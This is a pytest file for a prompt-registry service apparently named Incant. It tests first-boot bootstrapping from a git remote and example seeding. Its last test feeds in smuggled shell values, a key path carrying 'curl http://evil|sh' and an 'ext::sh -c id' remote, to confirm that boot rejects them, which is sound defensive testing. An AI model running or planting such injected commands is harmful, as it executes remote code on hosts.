"""First-boot content bootstrap (§6): INCANT_BOOTSTRAP_REMOTE clones, adopts a
populated Incant repo into an empty database, or starts fresh against a blank
remote — and refuses to boot when the remote is unreachable."""

from __future__ import annotations

import subprocess

import pytest
from fastapi.testclient import TestClient

from incant import db, models
from incant.config import Settings, set_settings
from incant.db import session_scope
from incant.service import AppContext, reset_app

from .conftest import db_url_for, reset_schema
from .test_server import ADMIN, auth


def _boot(tmp_path, **overrides):
    set_settings(Settings(
        database_url=db_url_for(tmp_path),
        repo_path=str(tmp_path / "repo"),
        bootstrap_admin_key=ADMIN,
        **overrides,
    ))
    db.reset_engine()
    reset_app()
    reset_schema()
    from incant.server.app import create_app
    return TestClient(create_app())


def _bare(path) -> str:
    subprocess.run(["git", "init", "--bare", "--initial-branch=main", str(path)],
                   capture_output=True, check=True)
    return str(path)


def test_blank_remote_registers_and_receives_the_fresh_lineage(tmp_path):
    remote = _bare(tmp_path / "backup.git")
    with _boot(tmp_path, bootstrap_remote=remote) as client:
        listing = client.get("/mgmt/remotes", headers=auth()).json()["remotes"]
        assert len(listing) == 1 and listing[0]["enabled"] is True
        # The blank clone was seeded with main and pushes cleanly from minute one.
        r = client.post(f"/mgmt/remotes/{listing[0]['id']}/push", headers=auth())
        assert r.status_code == 200 and r.json()["error"] is None, r.text


def test_populated_remote_is_adopted_into_an_empty_database(tmp_path):
    # Instance A authors content and mirrors it to the remote.
    set_settings(Settings(database_url=db_url_for(tmp_path),
                          repo_path=str(tmp_path / "repo-a"),
                          bootstrap_admin_key=ADMIN))
    db.reset_engine(); reset_app(); reset_schema()
    ctx = AppContext(); ctx.initialize()
    with session_scope() as s:
        s.add(models.Environment(id="prod", name="prod"))
    with session_scope() as s:
        reg = ctx.registry(s, "ana")
        reg.create_prompt("acme/system")
        d = reg.create_draft("acme/system", version_number=1, author="ana",
                             content="Hello {{ who }}")
        reg.commit_draft(d.id, author="ana")
        d2 = reg.create_draft("acme/system", version_number=2, author="ana",
                              content="Hi {{ who }} v2")
        reg.commit_draft(d2.id, author="ana")
    remote = _bare(tmp_path / "backup.git")
    ctx.git.push_mirror(remote)

    # Instance B: empty repo volume + empty database + the bootstrap remote.
    with _boot(tmp_path / "b", bootstrap_remote=remote) as client:
        # The default environment is created at boot (control plane isn't in
        # git), so the adopted registry is browsable immediately.
        ov = client.get("/mgmt/overview?environment=prod", headers=auth())
        assert ov.status_code == 200, ov.text
        adopted = {p["prompt_id"] for proj in ov.json()["projects"]
                   for p in proj["prompts"]}
        assert "acme/system" in adopted
        vs = client.get("/mgmt/prompts/acme/system/versions?environment=prod",
                        headers=auth())
        assert vs.status_code == 200, vs.text
        numbers = {v["version"] for v in vs.json()["versions"]}
        assert numbers == {1, 2}
        # Single-project constraint adopted too: the project is acme now.
        r = client.post("/mgmt/prompts", json={"prompt_id": "other/x"}, headers=auth())
        assert r.status_code == 409


def test_setup_status_and_seed_example_first_run(tmp_path):
    with _boot(tmp_path) as client:
        # Fresh deployment: the checklist reports an empty library.
        status = client.get("/mgmt/setup-status", headers=auth())
        assert status.status_code == 200, status.text
        s0 = status.json()
        assert s0["prompts"] == 0 and s0["people"] == 0 and s0["remotes"] == 0
        # The auto-created bootstrap ADMIN key must not tick the renderer-key item.
        assert s0["renderer_keys"] == 0

        # Load the example dataset; the renderer key is issued exactly once.
        r = client.post("/mgmt/seed-example", headers=auth())
        assert r.status_code == 200, r.text
        assert r.json()["renderer_key"].startswith("incant_sk_")

        s1 = client.get("/mgmt/setup-status", headers=auth()).json()
        assert s1["prompts"] > 0 and s1["renderer_keys"] == 1

        # The seeded library is immediately servable and browsable.
        ov = client.get("/mgmt/overview?environment=prod", headers=auth())
        assert ov.status_code == 200, ov.text
        seeded = {p["prompt_id"] for proj in ov.json()["projects"]
                  for p in proj["prompts"]}
        assert "support/system" in seeded

        # The example's environment story is ENFORCED even though boot pre-created
        # prod unprotected: locked prod, track-tip staging.
        envs = {e["id"]: e for e in client.get("/mgmt/envs", headers=auth()).json()["environments"]}
        assert envs["prod"]["protected"] is True
        assert envs["staging"]["track_tip"] is True

        # One-shot: a second seed is refused now that prompts exist.
        again = client.post("/mgmt/seed-example", headers=auth())
        assert again.status_code == 409
        assert "already has prompts" in again.json()["detail"]


def test_seed_example_lands_in_the_bound_project(tmp_path):
    """A deployment named at setup (e.g. "pm-review") gets the example dataset in
    ITS namespace — the seed must not fight the one-project rule with a 500."""
    with _boot(tmp_path) as client:
        r = client.post("/mgmt/projects", json={"id": "pm-review"}, headers=auth())
        assert r.status_code == 200, r.text

        r = client.post("/mgmt/seed-example", headers=auth())
        assert r.status_code == 200, r.text
        assert r.json()["project"] == "pm-review"
        renderer_key = r.json()["renderer_key"]

        ov = client.get("/mgmt/overview?environment=prod", headers=auth()).json()
        seeded = {p["prompt_id"] for proj in ov["projects"] for p in proj["prompts"]}
        assert "pm-review/system" in seeded
        assert not any(p.startswith("support/") for p in seeded)

        # End-to-end render under the new prefix — prod live is v3, whose template
        # includes the style fragment by its (rewritten) path, and the renderer
        # key's project scope must match the bound project.
        r = client.post("/prompt/pm-review/system",
                        json={"flags": {}, "variables": {"customer_name": "Acme",
                                                         "history": []}},
                        headers={"Authorization": f"Bearer {renderer_key}"})
        assert r.status_code == 200, r.text
        assert "plain English" in r.json()["prompt"]  # fragment content made it in


def test_unreachable_bootstrap_remote_fails_the_boot(tmp_path):
    with pytest.raises(RuntimeError, match="BOOTSTRAP_REMOTE"):
        with _boot(tmp_path, bootstrap_remote=str(tmp_path / "nope.git")):
            pass


def test_multi_project_repo_is_refused(tmp_path):
    set_settings(Settings(database_url=db_url_for(tmp_path),
                          repo_path=str(tmp_path / "repo-a"),
                          bootstrap_admin_key=ADMIN))
    db.reset_engine(); reset_app(); reset_schema()
    ctx = AppContext(); ctx.initialize()
    ctx.git.commit_version("alpha/x", 1, "a", author_name="A", author_email="a@x", message="a")
    ctx.git.commit_version("beta/y", 1, "b", author_name="B", author_email="b@x", message="b")
    remote = _bare(tmp_path / "backup.git")
    ctx.git.push_mirror(remote)

    with pytest.raises(RuntimeError, match="several top-level projects"):
        with _boot(tmp_path / "b", bootstrap_remote=remote):
            pass


def test_unsafe_bootstrap_remote_or_key_fails_the_boot(tmp_path):
    # INCANT_BOOTSTRAP_REMOTE(_KEY) become a registered remote's url/auth_ref and reach
    # a shell via git exactly like an admin-supplied remote — same grammar, and a bad
    # value fails the boot WITH ITS REASON rather than being registered.
    remote = _bare(tmp_path / "backup.git")
    with pytest.raises(RuntimeError, match="BOOTSTRAP_REMOTE_KEY rejected.*shell"):
        with _boot(tmp_path, bootstrap_remote=remote,
                   bootstrap_remote_key="/run/key; curl http://evil|sh #"):
            pass
    with pytest.raises(RuntimeError, match="BOOTSTRAP_REMOTE.*remote-helper"):
        with _boot(tmp_path / "b", bootstrap_remote="ext::sh -c id"):
            pass
